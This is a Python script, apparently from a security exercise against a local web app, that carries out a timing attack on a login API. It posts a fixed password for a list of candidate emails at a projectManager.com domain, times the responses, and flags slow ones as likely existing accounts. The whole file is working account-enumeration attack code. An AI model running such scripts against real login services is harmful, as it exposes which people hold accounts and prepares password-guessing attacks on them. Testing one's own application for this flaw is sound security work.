#!/usr/bin/env python3
import requests
import time
import statistics

TARGET = "http://localhost/api/users/login"

def measure_response_time(email, samples=5):
    """Mide tiempo de respuesta promedio"""
    times = []
    
    for _ in range(samples):
        start = time.time()
        requests.post(TARGET, json={
            "email": email,
            "password": "testpassword123"
        })
        elapsed = time.time() - start
        times.append(elapsed)
    
    return statistics.mean(times), statistics.stdev(times)

# Test con emails
test_emails = [
    "ander@ander.com",     
    "noexiste@test.com",   
    "admin@admin.com",     
    "monre@monre.com",
    "alex@projectManager.com",
    "carla.santos@projectManager.com",
    "jose.rodriguez@projectManager.com",
    "andrea.pm@projectManager.com",
    "maria.gomez@projectManager.com",
    "teamlead@projectManager.com",
    "soporte@projectManager.com",
    "gestion.proyectos@projectManager.com",
    "coordinacion@projectManager.com",
    "ricardo.luna@projectManager.com",
    "isabel@projectManager.com",
    "mariano.pm@projectManager.com",
    "ana.fernandez@projectManager.com",
    "mark.jones@projectManager.com",
    "paula.castillo@projectManager.com",
    "david.sanchez@projectManager.com",
    "equipo@projectManager.com",
    "administracion@projectManager.com",
    "contacto@projectManager.com",
    "proyectos@projectManager.com",
    "reclutamiento@projectManager.com",
    "marketing@projectManager.com",
    "ventas@projectManager.com",
    "asistente@projectManager.com",
    "planificacion@projectManager.com",
    "luis.martinez@projectManager.com",
    "sofia.garcia@projectManager.com",
    "javier@projectManager.com",
    "antonio.lopez@projectManager.com",
    "laura@projectManager.com",
    "manager1@projectManager.com",
    "manager2@projectManager.com",
    "manager3@projectManager.com",
    "project.team@projectManager.com",
    "consultoria@projectManager.com",
    "rrhh@projectManager.com",
    "finanzas@projectManager.com",
    "direccion@projectManager.com",
    "coordinador@projectManager.com",
    "seguimiento@projectManager.com",
    "evaluacion@projectManager.com",
    "edgar.pm@projectManager.com",
    "veronica.perez@projectManager.com",
    "cliente1@projectManager.com",
    "cliente2@projectManager.com",
    "interno@projectManager.com",
    "reportes@projectManager.com",
    "comunicacion@projectManager.com",
    "presupuestos@projectManager.com",
    "innovacion@projectManager.com"
]

print("[*] Timing attack...\n")

slow = []
THRESH_MS = 200.0

for email in test_emails:
    mean, stdev = measure_response_time(email)
    mean_ms = mean * 1000.0
    stdev_ms = stdev * 1000.0
    if mean_ms > THRESH_MS:
        slow.append((email, mean_ms, stdev_ms))

# Mostrar solo los que pasan del umbral
for email, mean_ms, stdev_ms in slow:
    print(f"{email:30} → {mean_ms:.2f}ms ± {stdev_ms:.2f}ms")